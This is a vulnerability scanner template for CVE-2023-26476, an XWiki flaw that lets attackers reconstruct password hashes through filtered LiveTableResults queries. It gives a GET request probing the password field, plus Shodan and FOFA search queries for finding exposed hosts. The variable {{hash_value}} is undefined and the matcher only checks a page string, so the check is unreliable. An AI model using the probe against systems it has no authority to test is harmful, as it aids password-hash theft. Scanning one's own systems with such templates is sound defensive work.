id: CVE-2023-26476

info:
  name: XWiki Password Hash Reconstruction via LiveTableResults
  author: ProjectDiscoveryAI
  severity: high
  description: |
    XWiki Platform is vulnerable to password hash reconstruction via repeated calls to LiveTableResults and WikisLiveTableResultsMacros.
    The vulnerability allows deducing the content of the password fields by making multiple requests with different filter conditions.
  impact: |
    High - Allows attackers to reconstruct password hashes
  remediation: |
    Upgrade XWiki to a version that fixes the vulnerability
  reference:
    - https://jira.xwiki.org/browse/XWIKI-19949
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-26476
    cwe-id: CWE-200,CWE-307
    epss-score: 0.00168
    epss-percentile: 0.54673
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
  metadata:
    vendor: xwiki
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    fofa-query: body="data-xwiki-reference"

http:
  - method: GET
    path:
      - "{{BaseURL}}/xwiki/bin/get/XWiki/LiveTableResults?outputSyntax=plain&classname=XWiki.XWikiUsers&collist=password&password=hash:SHA-512:{{hash_value}}"

    matchers:
      - type: word
        words:
          - "XWiki.XWikiUsers"
        part: body
